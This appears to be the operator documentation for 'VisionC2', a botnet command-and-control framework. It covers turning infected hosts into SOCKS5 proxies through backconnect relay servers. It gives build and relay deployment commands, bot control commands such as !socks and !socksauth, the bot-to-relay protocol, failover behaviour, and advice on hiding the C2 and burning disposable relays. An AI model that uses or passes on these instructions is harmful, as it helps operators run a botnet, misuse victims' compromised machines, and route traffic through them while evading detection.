# SOCKS5 Proxy & Relay Server

VisionC2 supports two SOCKS5 proxy modes: **backconnect** (via relay server) and **direct** (local listener on bot).

---

## Architecture

### Backconnect Mode (Recommended)

```
User ──[SOCKS5]──▶ Relay Server ◀──[backconnect TLS]── Bot ──▶ Target
                   (your VPS)                          (infected host)
```

- Bot connects **OUT** to the relay — never opens a port
- Users connect to the relay's SOCKS5 port with credentials
- C2 address is never exposed — relay is separate infrastructure
- If the relay gets burned, deploy a new one and add it to the CNC dashboard — no rebuilds

### Direct Mode

```
User ──[SOCKS5]──▶ Bot:1080 ──▶ Target
```

- Bot opens a SOCKS5 listener directly on a port
- Simpler, but exposes the bot's IP and opens an inbound port
- Use when you don't need relay infrastructure

---

## Quick Start

### 1. Build Everything

```bash
python3 setup.py    # Option 1: Full Setup
```

Setup builds three binaries:
- `server` — CNC server
- `relay_server` — relay server
- `bins/` — bot binaries (14 architectures)

Proxy credentials are **auto-generated** (12-char random) and printed during setup. Relay endpoints are **never baked** — managed at runtime via the CNC dashboard.

### 2. Deploy the Relay

Copy `relay_server` to a VPS (**not** your C2 server):

```bash
# Minimal — auth key is baked in from setup.py
./relay_server

# Report stats to CNC dashboard (recommended)
./relay_server -name relay-us -c2 https://cnc.example.com/api/relay-report -interval 30

# With stats monitoring (local plaintext endpoint)
./relay_server -stats 127.0.0.1:9090

# Custom ports
./relay_server -cp 9001 -sp 1080

# With your own TLS cert
./relay_server -cert server.crt -keyfile server.key
```

**Default ports:**
| Port | Purpose |
|------|---------|
| 9001 | Control port (TLS) — bots connect here |
| 1080 | SOCKS5 port — proxy clients connect here |

### 3. Register the Relay in CNC

Open the **SOCKS tab** in the web dashboard → the relay health section shows all registered relays.

- Click **+ Add Relay** — enter `host:controlPort:socksPort` (e.g. `relay.example.com:9001:1080`)
- The relay is saved to `cnc/db/relays.json` — persists across CNC restarts
- Once the relay binary is running with `-c2 <url>`, its live stats appear on the card within one push interval

### 4. Activate from CNC

**Web dashboard** — left-click any bot → sidebar → **Start SOCKS** → pick mode and relay from dropdown

**TUI mode** — go to Socks Manager (option 3 on main menu):
- `c` — Custom relay (enter relay:port manually)
- `d` — Direct mode (enter port, opens listener on bot)
- `x` — Stop proxy

**Telnet/split mode:**
```
!socks relay.example.com:9001   # Backconnect to specific relay
!socks r1:9001,r2:9001          # Multiple relays with failover
!socks 1080                     # Direct mode (local listener on port 1080)
!stopsocks                      # Stop proxy
!socksauth newuser newpass      # Change credentials at runtime
```

> **Note:** `!socks` with no arguments now returns a usage error — relay address must always be supplied. There are no baked-in endpoints.

### 5. Connect as a User

```bash
# curl
curl --socks5 relay.example.com:1080 -U <user>:<pass> http://target.com

# proxychains (add to /etc/proxychains4.conf)
socks5 relay.example.com 1080 <user> <pass>

# Direct mode (no relay)
curl --socks5 BOT_IP:1080 -U <user>:<pass> http://target.com
```

---

## Relay Server Reference

### Command-Line Flags

| Flag | Default | Description |
|------|---------|-------------|
| `-cp` | `9001` | Control port for bot backconnect (TLS) |
| `-sp` | `1080` | SOCKS5 port for proxy clients |
| `-key` | (built-in) | Auth key override — defaults to key baked in by setup.py |
| `-cert` | (auto) | TLS certificate file — auto-generates self-signed if empty |
| `-keyfile` | (auto) | TLS private key file |
| `-stats` | (off) | Local stats endpoint (e.g. `127.0.0.1:9090`) — plaintext CLI |
| `-c2` | (off) | CNC relay-report URL — pushes stats periodically |
| `-interval` | `30` | Stats push interval in seconds (requires `-c2`) |
| `-name` | `relay` | Relay name shown in CNC dashboard (requires `-c2`) |

### CNC Stats Reporting

Start relay with `-c2` to push live stats to the CNC dashboard:

```bash
./relay_server \
  -name relay-us-1 \
  -c2 https://cnc.example.com/api/relay-report \
  -interval 30
```

The CNC SOCKS tab shows a card per relay with:
- Status dot (green = seen within 90s, red = stale/down)
- Active connections, total sessions, failed sessions
- Bandwidth up/down
- Connected bot count
- Uptime
- Last seen timestamp

Stats are authenticated via the `X-Relay-Key` header (must match `MAGIC_CODE` from setup.py).

### Local Stats Monitoring

Start with `-stats` for a local plaintext endpoint:
```bash
./relay_server -stats 127.0.0.1:9090
```

Check stats:
```bash
nc 127.0.0.1 9090
```

Output:
```
╔══════════════════════════════════════════════╗
║          RELAY STATUS                        ║
╠══════════════════════════════════════════════╣
  Sessions total:    42
  Sessions active:   3
  Sessions failed:   1
  Bandwidth up:      12.45 MB
  Bandwidth down:    89.23 MB
  Bandwidth total:   101.68 MB
  Bot connects:      5
  Auth failures:     0
╠══════════════════════════════════════════════╣
║          CONNECTED BOTS                      ║
╠══════════════════════════════════════════════╣
  BOT ID       REMOTE ADDR            UPTIME
  ────────────────────────────────────────────
  a1b2c3d4     203.0.113.50:49281     2h15m30s
  e5f6g7h8     198.51.100.22:52104    45m12s
╠══════════════════════════════════════════════╣
  Pending sessions:  0
╚══════════════════════════════════════════════╝
```

### Relay Protocol

```
Bot → Relay:   RELAY_AUTH:<key>:<botID>\n     (authenticate)
Relay → Bot:   RELAY_OK\n                     (accepted)
Relay → Bot:   RELAY_NEW:<sessionID>\n        (new client waiting)
Bot → Relay:   RELAY_DATA:<sessionID>\n       (data channel)
Bot → Relay:   RELAY_PING\n                   (keepalive, every 60s)
```

---

## Relay Management (Dashboard)

All relay lifecycle management happens in the **SOCKS tab** of the web dashboard. No rebuilds required.

| Action | How |
|--------|-----|
| Add relay | SOCKS tab → "+ Add Relay" → enter `host:controlPort:socksPort` |
| Remove relay | Click × on relay card |
| View live stats | Relay card updates every 15s (requires relay running with `-c2`) |
| Update credentials | TUI or `!socksauth <user> <pass>` at runtime |

Relay list is stored in `cnc/db/relays.json` — survives CNC restarts.

---

## Multi-Relay Failover

Bots support unlimited relay endpoints with automatic failover when multiple addresses are supplied at runtime:

1. **Shuffle on startup** — bots randomize the relay list so they spread across relays
2. **Quick rotation** — on disconnect, bot tries the next relay (0.5–2s jitter)
3. **Exponential backoff** — after all relays fail one full rotation, wait 5s → 10s → 20s → 40s → 60s (cap)
4. **Auto-reconnect** — keeps trying until `!stopsocks` is issued

### Multiple Relays at Runtime

```
!socks relay-us.example.com:9001,relay-eu.example.com:9001,relay-ap.example.com:9001
```

---

## Credentials

### Default Credentials

Generated automatically by `setup.py` — unique per build, printed to console during setup.
All SOCKS5 connections require these credentials.

### Change at Runtime

From CNC:
```
!socksauth myuser mypass
```

Updates credentials on the targeted bot immediately for new connections.

### Rebuild with New Credentials

```bash
python3 setup.py    # Option 3: Update Config
```

---

## Security Notes

- **Relay is disposable** — deploy on cheap VPS, burn and replace; just add the new one in dashboard
- **C2 never exposed** — bot connects to relay, not the other way around
- **No relay baked in binary** — relay address supplied at runtime; compromising a bot binary reveals nothing about relay infrastructure
- **TLS everywhere** — bot↔relay uses TLS 1.3 (same as bot↔C2)
- **Auth required** — both bot→relay (magic code) and user→SOCKS5 (credentials) are authenticated
- **Stats endpoint is authenticated** — relay POSTs stats with `X-Relay-Key` header; CNC rejects anything that doesn't match `MAGIC_CODE`
- **Bind local stats to localhost** — always use `127.0.0.1` for the `-stats` flag, never `0.0.0.0`
- **Separate relay from C2** — the whole point is isolation; don't run both on the same server
